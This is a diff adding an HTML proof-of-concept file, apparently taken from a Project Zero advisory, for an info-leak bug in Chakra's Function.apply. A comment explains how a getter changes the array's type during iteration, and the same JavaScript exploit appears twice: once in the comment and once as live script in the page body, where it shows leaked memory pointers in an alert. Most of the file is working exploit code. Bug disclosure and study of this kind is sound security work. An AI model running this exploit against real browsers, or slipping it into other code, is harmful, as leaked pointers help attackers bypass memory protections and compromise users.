@@ -1,0 +1,84 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=920
+
+When Function.apply is called in Chakra, the parameter array is iterated through using JavascriptArray::ForEachItemInRange. This function accepts a templated parameter, hasSideEffect that allows the function to behave safely in the case that iteration has side effects. In JavascriptFunction::CalloutHelper (which is called by Function.apply) this parameter is set to false, even though iterating through the array can have side effects. This can cause an info leak if the side effects cause the array to change types from a numeric array to a variable array. A PoC is as folows and attached. Running this PoC causes an alert dialog with pointers in it.
+
+var t = new Array(1,2,3);
+
+function f(){
+
+var h = [];
+var a = [...arguments]
+for(item in a){
+	var n = new Number(a[item]);
+	if( n < 0){
+
+	n = n + 0x100000000;
+	}
+	h.push(n.toString(16));	
+}
+
+alert(h);
+}
+
+
+
+var q = f;
+
+t.length = 20;
+var o = {};
+  Object.defineProperty(o, '3', {
+    get: function() {
+      var ta = [];
+      ta.fill.call(t, "natalie");
+      return 5;
+    }
+  });
+
+t.__proto__ = o;
+
+var j = [];
+var s = f.apply(null, t);
+
+-->
+
+<html><body><script>
+
+var t = new Array(1,2,3);
+
+function f(){
+
+var h = [];
+var a = [...arguments]
+for(item in a){
+	var n = new Number(a[item]);
+	if( n < 0){
+
+	n = n + 0x100000000;
+	}
+	h.push(n.toString(16));	
+}
+
+alert(h);
+}
+
+
+
+var q = f;
+
+t.length = 20;
+var o = {};
+  Object.defineProperty(o, '3', {
+    get: function() {
+      var ta = [];
+      ta.fill.call(t, "natalie");
+      return 5;
+    }
+  });
+
+t.__proto__ = o;
+
+var j = [];
+var s = f.apply(null, t);
+
+</script></body></html>
